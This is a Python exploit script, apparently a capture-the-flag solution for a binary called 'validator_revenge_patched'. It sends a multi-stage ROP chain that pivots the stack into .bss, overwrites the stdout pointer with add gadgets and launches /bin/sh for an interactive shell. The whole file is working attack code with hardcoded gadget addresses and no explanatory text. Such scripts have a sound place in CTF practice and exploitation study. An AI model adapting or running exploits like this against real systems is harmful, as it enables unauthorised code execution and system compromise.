#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./validator_revenge_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x400801
c
'''

p = start()

# ==================== EXPLOIT ====================

def exploit():

    pop_rdi = 0x400873
    pop_rsi = 0x40068b
    pop_rdx = 0x400694
    pop_rbp = 0x400608
    leave_ret = 0x400800

    add_bl_bh = 0x4005cf
    add_ptr = 0x400668
    setup = 0x400699

    bss = 0x601800

    prefix = b'DREAMHACK!'

    lst = []
    for i in range(118, 0, -1):
        lst.append(i)


    payload = prefix + bytes(lst) + p64(0)
    payload += flat(
        pop_rdi, 0,
        pop_rsi, bss,
        pop_rdx, 0x400,
        exe.plt.read,
        pop_rbp, bss - 0x8, leave_ret,
    )


    # ptr stdout set at 0x6017c0

    '''
       0x7ffff7a654cb <setvbuf+363>    pop    rbx          RBX => 0
       0x7ffff7a654cc <setvbuf+364>    pop    rbp          RBP => 0x601800
       0x7ffff7a654cd <setvbuf+365>    pop    r12          R12 => 0x4005a0
       0x7ffff7a654cf <setvbuf+367>    pop    r13          R13 => 0x7fffffffdcd0
     â–º 0x7ffff7a654d1 <setvbuf+369>    ret                 <0x4006d9>
    '''

    pause()
    s(payload)

    payload = flat(
        setup,
        pop_rdx, 0x5600, add_bl_bh,
        pop_rbp, 0x6017c8 + 0x3d, add_ptr,
        pop_rsi, 0x6017c8 + 0x8, 
        pop_rdx, 0x400,
        pop_rdi, 0,
        exe.plt.read,
        pop_rbp, 0x6017c8 - 0x8, leave_ret,
        b'/bin/sh\0'
    )

    pause()
    s(payload)

    payload = flat(
        0xffffffffffcf8730,
        0, 0, 0,
        pop_rbp, 0x601798 + 0x3d, add_ptr,
        pop_rdi, bss+0x88,
        pop_rsi, 0, 
        pop_rdx, 0,
        pop_rbp, 0x601798 - 0x8, leave_ret
    )

    pause()
    s(payload)


    interactive()

if __name__ == '__main__':
    exploit()
